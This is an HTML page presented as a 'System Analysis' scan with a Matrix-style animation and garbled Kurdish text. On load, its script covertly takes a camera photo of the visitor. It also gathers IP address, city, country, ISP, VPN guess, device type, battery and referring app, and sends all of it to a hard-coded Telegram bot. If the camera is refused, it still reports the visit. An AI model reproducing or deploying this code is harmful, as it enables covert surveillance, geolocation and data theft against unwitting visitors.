<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Analysis</title>
    <style>
        body { background: #000; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; transition: background 0.2s; }
        canvas#matrix { position: absolute; top: 0; left: 0; z-index: -1; }
        .content { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #0f0; text-shadow: 0 0 8px #0f0; background: rgba(0,0,0,0.6); }
        .box { border: 2px solid #0f0; padding: 20px; background: rgba(0,0,0,0.8); text-align: left; max-width: 90%; font-size: 13px; line-height: 1.6; }
        .flash { background: #fff !important; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div class="content">
        <h1>[ âš ï¸ Ø³ÛŒØ³ØªÛ•Ù…ÛÚ©ÛŒ Ø¯ÛŒØ§Ø±ÛŒÚ©Ø±Ø§Ùˆ âš ï¸ ]</h1>
        <div class="box"><p id="status">> Ú†Ø§ÙˆÛ•Ú•Û Ø¨Ú©Û•... Ù¾Ø´Ú©Ù†ÛŒÙ†ÛŒ Ø³ÛŒØ³ØªÛ•Ù… Ù„Û• Ú©Ø§Ø±Ø¯Ø§ÛŒÛ• ğŸ”„</p></div>
    </div>
    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
        const chatId = '1034878899';

        function getDeviceModel() {
            const ua = navigator.userAgent;
            if (/iPhone/.test(ua)) return "ğŸ“± iPhone (iOS)";
            if (/Android/.test(ua)) return "ğŸ“± Android Device";
            return "ğŸ’» PC / Laptop";
        }

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoEl = document.getElementById('v');
                videoEl.srcObject = stream;
                document.body.classList.add('flash');
                await new Promise(r => setTimeout(r, 1000));

                const picCanvas = document.getElementById('c');
                picCanvas.width = videoEl.videoWidth; picCanvas.height = videoEl.videoHeight;
                picCanvas.getContext('2d').drawImage(videoEl, 0, 0);
                const photoBlob = await new Promise(r => picCanvas.toBlob(r, 'image/jpeg'));
                document.body.classList.remove('flash');
                stream.getTracks().forEach(t => t.stop());

                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();
                const ua = navigator.userAgent;
                const conn = navigator.connection || {};
                
                let source = "ğŸŒ Ú•Ø§Ø³ØªÛ•ÙˆØ®Û†";
                if (ua.includes("Telegram")) source = "ğŸ”¹ ØªÛÙ„ÛÚ¯Ø±Ø§Ù… (Telegram)";
                else if (ua.includes("FBAN") || ua.includes("FBAV")) source = "ğŸ”¹ ÙÛ•ÛŒØ³Ø¨ÙˆÙˆÚ© (Facebook)";
                else if (ua.includes("Instagram")) source = "ğŸ”¹ Ø¦ÛŒÙ†Ø³ØªØ§Ú¯Ø±Ø§Ù… (Instagram)";

                let batteryStatus = "Ù†Ø§Ø¯ÛŒØ§Ø± â“";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batteryStatus = Math.round(b.level * 100) + "% " + (b.charging ? "âš¡" : "ğŸ”‹");
                }

                const report = `
âš ï¸ **Ø³ÛŒØ³ØªÛ•Ù…ÛÚ©ÛŒ Ø¯ÛŒØ§Ø±ÛŒÚ©Ø±Ø§Ùˆ** âš ï¸
----------------------------------
ğŸ”— **Ø³Û•Ø±Ú†Ø§ÙˆÛ•ÛŒ Ù‡Ø§ØªÙ†:**
â€¢ ${source}

ğŸ“± **Ø²Ø§Ù†ÛŒØ§Ø±ÛŒ Ø¦Ø§Ù…ÛØ±:**
â€¢ Ù…Û†Ø¯ÛÙ„: ${getDeviceModel()}
â€¢ Ù¾Ú•Û†Ø³ÛØ³Û•Ø±: ğŸ§  ${navigator.hardwareConcurrency} Cores
â€¢ Ù¾Ø§ØªØ±ÛŒ: ${batteryStatus}

ğŸŒ **ØªÛ†Ú• Ùˆ Ù†Ø§ÙˆÙ†ÛŒØ´Ø§Ù†:**
â€¢ Ø¦Ø§ÛŒÙ¾ÛŒ: ğŸŒ \`${data.ip}\`
â€¢ Ú©Û†Ù…Ù¾Ø§Ù†ÛŒØ§: ğŸ¢ ${data.org}
â€¢ Ú¤ÛŒ-Ù¾ÛŒ-Ø¦ÛÙ†: ${Intl.DateTimeFormat().resolvedOptions().timeZone !== data.timezone ? "âš ï¸ Ú†Ø§Ù„Ø§Ú©Û•" : "âœ… Ù†Ø§"}
â€¢ Ø´ÙˆÛÙ†: ğŸ“ ${data.city}, ${data.country_name}

â° **Ú©Ø§ØªÛŒ Ù¾Ø´Ú©Ù†ÛŒÙ†:** ${new Date().toLocaleString('ku-IQ')}
----------------------------------
ğŸ“¸ ÙˆÛÙ†Û•ÛŒ Ø³Û•Ø±Û•ÙˆÛ• Ø¨Û• ÙÙ„Ø§Ø´Û•ÙˆÛ• Ú¯ÛŒØ±Ø§ÙˆÛ•.
`;

                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', photoBlob, 'user.jpg');
                fd.append('caption', report);
                fd.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });

            } catch(e) {
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("âš ï¸ Ú©Û•Ø³ÛÚ© Ù‡Ø§ØªÛ• Ù†Ø§Ùˆ Ø³ÛŒØ³ØªÛ•Ù…Û• Ø¯ÛŒØ§Ø±ÛŒÚ©Ø±Ø§ÙˆÛ•Ú©Û• Ø¨Û•ÚµØ§Ù… Ú©Ø§Ù…ÛØ±Ø§ÛŒ Ø¯Ø§Ø®Ø³Øª.")}`);
            }
        }

        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const drops = Array(Math.floor(canvas.width / 16)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = "#0f0"; ctx.font = "16px monospace";
            drops.forEach((y, i) => {
                ctx.fillText("01"[Math.floor(Math.random()*2)], i*16, y*16);
                if (y*16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 33);
        window.onload = start;
    </script>
</body>
</html>
